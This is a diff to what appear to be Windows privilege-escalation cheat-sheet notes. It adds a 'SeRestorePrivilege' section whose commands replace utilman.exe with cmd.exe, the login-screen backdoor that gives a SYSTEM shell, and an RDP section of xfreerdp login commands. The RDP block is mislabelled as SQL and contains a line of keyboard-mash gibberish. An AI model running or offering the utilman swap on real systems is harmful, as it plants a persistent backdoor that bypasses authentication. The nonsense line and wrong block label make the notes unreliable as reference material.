@@ -160,8 +160,22 @@ Run: cscript CreateShortcut.vbs
 Windows startup folder privilege escalation site:reddit.com
 
 
+## SeRestorePrivilege
 
+```powershell
+# Rename utilman.exe and copy cmd.exe in its place
+move C:\Windows\System32\utilman.exe C:\Windows\System32\utilman.bak
+copy C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
+```
 
+## rdp
+```sql
+xfreerdp3 /v:192.168.1.100 /u:username /p:password
+
+xfreerdp3 /v:target.domain.com /u:username /d:DOMAIN /auth-pkg-list:kerberos
+fucdiofjdsklfasdflsdajfldksarapemeflsdfkdsfks
+
+```
 
 8. LOLBAS (Windows GTFOBins)
 Living Off The Land Binaries – abuse trusted Windows tools:
